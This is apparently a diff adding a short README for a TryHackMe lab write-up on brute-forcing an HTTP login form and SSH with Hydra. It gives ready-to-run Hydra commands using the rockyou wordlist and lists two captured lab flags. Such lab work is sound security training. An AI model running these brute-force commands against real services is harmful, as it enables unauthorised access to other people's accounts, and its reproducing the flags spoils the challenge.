@@ -1,0 +1,50 @@
+# Hydra Brute Force Attack - TryHackMe
+
+## Overview
+
+This project demonstrates brute-force attacks using Hydra on web login and SSH services.
+
+## Tools Used
+
+* Hydra
+* Kali Linux
+* TryHackMe Lab
+
+## Attack Types
+
+* HTTP POST Login Brute Force
+* SSH Brute Force
+
+## Commands Used
+
+### HTTP Brute Force
+
+```
+hydra -l molly -P rockyou.txt 10.10.x.x http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+```
+
+### SSH Brute Force
+
+```
+hydra -l molly -P rockyou.txt 10.10.x.x ssh
+```
+
+## Results
+
+* Successfully cracked web login credentials
+* Gained SSH access
+
+## Flags Captured
+
+* Flag 1: THM{2673a7dd116de68e85c48ec0b1f2612e}
+* Flag 2: THM{8cebe0468febbaddea859baeb33b2541b}
+
+## Learning Outcome
+
+* Understood brute-force attacks
+* Learned Hydra syntax and usage
+* Practiced real-world credential attacks
+
+## Screenshots
+
+(See /screenshots folder)
